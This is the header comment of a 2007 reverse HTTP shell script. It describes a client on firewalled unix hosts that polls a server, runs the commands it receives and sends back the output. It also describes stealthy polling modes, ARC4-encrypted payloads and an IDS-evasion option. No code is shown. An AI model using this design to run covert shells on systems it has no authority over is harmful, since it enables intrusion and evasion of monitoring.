#	Reverse HTTP shell 
#       Copyright 2007 Martin Obiols Herrera

# author: Martin Obiols Herrera -- OleMoudi <olemoudi AT users.sourceforge.net>
# started: 09/Sept/2007
#	
#	Script to maintain a basic shell remotely on unix systems behind firewalls.
#	Client gets commands by periodically polling the server and sends the output back
#	after executing them. Traffic traverses firewall as standard outgoing HTTP GET/POST requests.
#	HTTP requests/responses carry payload b64 encoded. Optional encryption is supported (and highly recommended).
#	
#	Polling period between requests can be modified sending commands like "%polling_type",
#	where "polling_type" is one of the following:
#		-insane: 10 seconds between requests
#		-agressive: 25 seconds between requests
#		-normal: 60 seconds between requests
#		-polite: 5 mins between requests
#		-paranoid: 30 mins between requests
#		-stealth: 60 mins between requests
#		-adaptative: dinamically increases polling period when no commands are received until
#			     reaching stealth type, and waking up again to lowest period after each new command.
#
#	Be aware that when ids-evasion flag is set, all the above times are modified randomly with each
#	polling period between original value and 2 x original value.
#
#	Payload encryption uses ARC4 (requires python-crypto package). Client sends with each request a 
#	special header with a unique salt (str(randint(1,1000)) + str(time.time()). Server response and
#	next client POST request will be encrypted using the password+salt. This way client gets protected
#	against retransmission attacks.
#	
#
#	TODO:
#		-Better error handling
#		-Support for interactive commands
#		-Code clean up
#		-Comments -_-zZZ
